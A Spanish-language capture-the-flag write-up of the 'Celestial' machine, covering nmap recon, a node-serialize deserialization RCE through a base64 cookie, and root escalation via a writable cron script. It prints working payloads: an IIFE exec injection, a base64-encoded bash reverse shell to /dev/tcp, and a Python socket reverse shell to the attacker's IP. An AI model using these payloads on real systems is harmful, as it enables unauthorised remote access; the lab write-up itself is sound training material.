---
layout: single
title: Celestial Writeup
excerpt: "Celestial es un desafío de nivel medio que pone a prueba las habilidades en la explotación de aplicaciones web que emplean Nodejs, Indispensable una buena metodologia de enumeracion una vez dentro, el verdadero reto se centra en la escalada de privilegios mediante la explotación de configuraciones inadecuadas en tareas CRON y permisos mal gestionados."
date: 2024-11-16
classes: wide
header: 
 teaser: /assets/images/Celestial/teaserImage.webp
 teaser_home_page: true
categories: 
 - Linux
 - Medium
tags:
 - Deserialization Attack
 - Cron jobs
 - Web
 - Node
---

# Reconocimiento

El siguiente comando realiza un escaneo de puertos utilizando **nmap**.

```bash
nmap -p- --open -vvv -n -sS -n -Pn --min-rate 5000 10.129.228.94 -oG portScan
```

> **-n** Evita la resolución de nombres de dominio a direcciones IP.

> **-sS** Envía una paquete con la flag SYN para iniciar una conexión, sí el puerto en el servidor esta abierto responde con un paquete SYN-ACK, sí el puerto esta cerrado este responde con un paquete RST(reset) en el caso de no obtener una respuesta puede significar que el puerto esta siendo filtrado por un firewall. Esto hace que el escaneo sea menos detectable por los registros del sistema y mas rapido, ya que no se establece una conexión completa.

> **-Pn** Por defecto nmap intenta determinar si un host se encuentra activo mediante un ping, con esta flag evitamos esto y suponemos que el host se encuentra activo.

> **-oG** Exporta el output de nmap en un formato grepeable a un fichero.

El resultado evidencia un puerto abierto.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/nmapScan.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Para obtener más información, se utiliza el conjunto de scripts de **nmap** para el reconocimiento de servicios en puertos específicos.

```bash
nmap -p 3000 -sC -sV IP
```

El resultado indica que la máquina emplea **Node.js** con el framework **Express**.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/serviceScan.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Al acceder a la página a través del puerto **3000**, se presenta el siguiente mensaje.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/webPage.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Tras un escaneo de directorios y vhosts sin resultados relevantes, y luego de analizar la petición mediante Burpsuite, se detecta una cookie codificada en formato **BASE64**.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/Cookie.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Al decodificar la cookie, se identifica un objeto **JSON**. En aplicaciones basadas en **Node.js**, este tipo de objetos sugiere que podría estar utilizándose la librería **node-serialize** en el backend. Si esta librería deserializa el objeto JSON de manera insegura, es posible explotar un **RCE (Remote Code Execution)** mediante una **IIFE (Immediately Invoked Function Expression)**

```javascript
"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.192', function(error, stdout, stderr){console.log(stdout)});}()"
```

Analizando las respuestas que se obtienen al manipular el objeto **JSON** antes de ser enviado al backend, ocurre un pequeño leak de información en el mensaje de error, ya que se está enviando el objeto sin formato **base64** provocando un error de sintaxis en la estructura de este.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/Cookie.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Lo primero que se puede confirmar es de que la aplicación utiliza el módulo de Node.js  **node-serialize** el cual es empleado para la serializacion y deserealizacion de objetos en el backend, lo que es una buena señal para intentar un ataque de deserialización. También se evidencia que la aplicacion se encuentra montada en el directorio personal de un usuario del sistema, llamado **sun**.

```bash
/home/sun/server.js
```

Aunque no hay un servicio **SSH** disponible para intentar un ataque de fuerza bruta contra este usuario, se plantea un ataque de deserialización para explotar la vulnerabilidad.

-------------------------------------
# Explotación

Después de interactuar con cada uno de los parámetros del objeto **JSON** se evidencia que los atributos **username, country** al parecer no son tratados por el backend y simplemente son representados en la página web, pero algo distinto sucede con el último atributo llamado **num** al cual si le ingresamos cualquier texto obtenemos la siguiente respuesta.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/referenceError.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

El error **ReferenceError** se debe a que se está tratando de ejecutar dentro de la función **eval** una variable que no se encuentra definida en el contexto de la aplicación; por ende, al no ser encontrada se genera este error.

Para entender esto mejor, primero entendamos como funciona **eval()**. Esta función permite tomar una cadena de texto y la ejecuta como código JavaScript en tiempo de ejecución. Esto quiere decir que puede interpretar y ejecutar expresiones, declaraciones o incluso funciones definidas en el texto que recibe.

Ejemplo:

```javascript
let operacion_matematica = "let num = 10; num * 2;";
console.log(eval(operacion_matematica));

// Obtendriamos el resultado de la operacion = 20
```

Para la explotación, teniendo el anterior concepto claro, podemos entender cómo funciona este en la deserealización. Cuando la bandera **\_\$\$ND_FUNC\$$\_**  es añadida a un objeto serializado, dentro del archivo **serialize.js** del módulo **node-serialize** podemos encontrar cómo se emplea la deserialización. Cuando dicha bandera es encontrada, la función **eval()** es empleada para deserializar, pero esto no quiere decir que la función será ejecutada. Para que sea ejecutada en tiempo de ejecución debemos de usar una **IIFE(Immediately Invoked Function Expression)** que se representa con un paréntesis simple al final de la función, por ejemplo.

```javascript
_$$ND_FUNC$$_function()require{('child_process').exec('ping -c 1 IP', function(error, stdout, stderr){ console.log(stdout) });}()
```

```javascript
{"username":"Master Mind","country":"Pakistan","city":"Lametown","num":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 1 IP', function(error, stdout, stderr) { console.log(stdout) }); }()"}%3d%3d
```

Todo el objeto debe de codificarse en **base64** para evitar errores en el lado del backend.

```base64
eyJ1c2VybmFtZSI6Ik1hc3RlciBNaW5kIiwiY291bnRyeSI6IlBha2lzdGFuIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDEgMTAuMTAuMTQuMTkyJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7IH0oKSJ9%3d%3d
```

<div style="text-align: center;">
		<img src="/assets/images/Celestial/poc1.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Para confirmar la vulnerabilidad, se escucha el tráfico ICMP entrante en la máquina atacante.

```bash
tcpdump -i tun0 icmp -n
```

Los resultados demuestran la vulnerabilidad a un **ataque de deserialización** que permite una ejecución remota de comandos **RCE**.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/poc2.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>
Se configura una shell inversa para ganar acceso.

```bash
nc -lvnp 1243
```

Se envía la función maliciosa insertada en el objeto **JSON**.

```bash
{"username":"Master Mind","country":"Pakistan","city":"Lametown","num":"_$$ND_FUNC$$_function(){ require('child_process').exec('echo IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkyLzQ0NDQgMD4mMQo= | base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) }); }()"}%3d%3d
```

```bash
eyJ1c2VybmFtZSI6Ik1hc3RlciBNaW5kIiwiY291bnRyeSI6IlBha2lzdGFuIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdlY2hvIEl5RXZZbWx1TDJKaGMyZ0tDbUpoYzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRBdU1UQXVNVFF1TVRreUx6UTBORFFnTUQ0bU1Rbz0gfCBiYXNlNjQgLWQgfCBiYXNoJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7IH0oKSJ9%3d%3d
```

Finalmente se obtiene acceso a la máquina víctima.

<div style="text-align: center;">
		<img src="/assets/images/Celestial/shell.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

--------------------------------------------------
# Escalada

Durante la enumeración de tareas programadas **(CRON)**, se encuentra un script ejecutado por el usuario **root**.

```bash
cat /var/logs/syslog | grep "CRON"
```

<div style="text-align: center;">
		<img src="/assets/images/Celestial/syslog.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

Dicha tarea está ejecutando el siguiente comando.

```bash
python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```

Lo primero que llama la atención es el fichero con extensión **.py** el cual está siendo ejecutado por el interprete de **python** y puede representar una potencial vía para la escalada de privilegios, ya que si el fichero ejecutado cuenta con permisos de escritura para usuarios no privilegiados, podríamos sobrescribir el fichero con código malicioso que posteriormente el usuario **root** ejecuta.

El script en cuestión tiene permisos de escritura para usuarios no privilegiados, lo que permite sobrescribirlo con código malicioso.

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.192',8833));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /home/sun/Documents/script.py
```

La máquina atacante se pone en modo escucha.

```bash
nc -lvnp 4444
```

Se espera que la tarea se ejecute, ya que esta lo hace cada 5 minutos.

<div style="text-align: center;">
  <iframe src="https://giphy.com/embed/E4pi99w43ecCV1n9jF" width="480" height="274" style="pointer-events: none" oncontextmenu="return false;" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/embed/E4pi99w43ecCV1n9jF"></a></p>
</div>
<br>

<div style="text-align: center;">
	<img src="/assets/images/Celestial/root.jpg" alt="Celestial" width="1000" oncontextmenu="return false;" />
</div>
<br>

!!Obtenemos nuestra shell como el usuario **root**!!

